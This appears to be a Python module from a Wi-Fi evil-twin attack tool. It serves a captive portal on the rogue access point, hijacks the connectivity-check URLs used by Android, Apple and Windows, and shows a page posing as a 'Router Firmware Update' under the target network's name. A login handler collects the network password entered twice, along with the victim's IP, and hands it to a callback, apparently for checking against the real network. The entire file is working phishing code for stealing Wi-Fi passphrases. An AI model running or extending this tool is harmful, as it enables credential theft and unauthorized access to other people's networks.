#!/usr/bin/env python3
"""Isolated captive-portal HTTP server bound to the Twin AP address."""
import json
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Callable, Optional
from urllib.parse import parse_qs, urlparse

PORTAL_TEMPLATE = Path(__file__).resolve().parent.parent / "templates" / "portal.html"

CAPTIVE_PATHS = {
    "/generate_204",
    "/gen_204",
    "/generate204",
    "/hotspot-detect.html",
    "/library/test/success.html",
    "/ncsi.txt",
    "/connecttest.txt",
    "/success.txt",
    "/canonical.html",
    "/redirect",
    "/connectivity-check.html",
    "/success",
}


def load_portal_html(essid: str = "") -> bytes:
    html = PORTAL_TEMPLATE.read_text(encoding="utf-8")
    if essid:
        html = html.replace("this network", essid)
        html = html.replace("<title>Router Firmware Update</title>", f"<title>{essid}</title>")
    return html.encode("utf-8")


class PortalState:
    def __init__(self, essid: str, ap_ip: str, on_password: Optional[Callable] = None):
        self.essid = essid
        self.ap_ip = ap_ip
        self.on_password = on_password
        self.hits = 0
        self.lock = threading.Lock()
        self.html = load_portal_html(essid)


def build_handler(state: PortalState):
    class PortalHandler(BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            return

        def _portal_url(self) -> str:
            return f"http://{state.ap_ip}/?ssid={state.essid}"

        def _send(self, code: int, body: bytes, content_type: str = "text/html; charset=utf-8"):
            self.send_response(code)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(body)

        def _redirect_portal(self):
            self.send_response(302)
            self.send_header("Location", self._portal_url())
            self.send_header("Cache-Control", "no-store")
            self.end_headers()

        def do_HEAD(self):
            self.do_GET()

        def do_GET(self):
            path = urlparse(self.path).path or "/"
            with state.lock:
                state.hits += 1
            if path in CAPTIVE_PATHS or path.startswith("/hotspot-detect"):
                self._redirect_portal()
                return
            if path in {"/", "/index.html", "/login", "/login.html"}:
                self._send(200, state.html)
                return
            self._redirect_portal()

        def do_POST(self):
            path = urlparse(self.path).path
            if path != "/login.cgi":
                self._redirect_portal()
                return
            length = int(self.headers.get("Content-Length") or 0)
            raw = self.rfile.read(length).decode("utf-8", errors="replace")
            fields = parse_qs(raw)
            password = (fields.get("password") or [""])[0]
            password2 = (fields.get("password2") or [""])[0]
            if not password or password != password2:
                payload = {"ok": False, "error": "Passwords do not match."}
                self._send(200, json.dumps(payload).encode("utf-8"), "application/json")
                return
            result = {"ok": True, "pending": True, "valid": False}
            if state.on_password:
                result = state.on_password(password, self.client_address[0] if self.client_address else "")
                result = result or {"ok": True, "pending": True, "valid": False}
            self._send(200, json.dumps(result).encode("utf-8"), "application/json")

    return PortalHandler


class PortalServer:
    def __init__(self, host: str, port: int, essid: str, on_password: Optional[Callable] = None):
        self.host = host
        self.port = port
        self.state = PortalState(essid, host, on_password)
        self._httpd = None
        self._thread = None

    def start(self):
        handler = build_handler(self.state)
        self._httpd = ThreadingHTTPServer((self.host, self.port), handler)
        self._thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        self._thread.start()

    def stop(self):
        if self._httpd:
            self._httpd.shutdown()
            self._httpd.server_close()
            self._httpd = None
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None
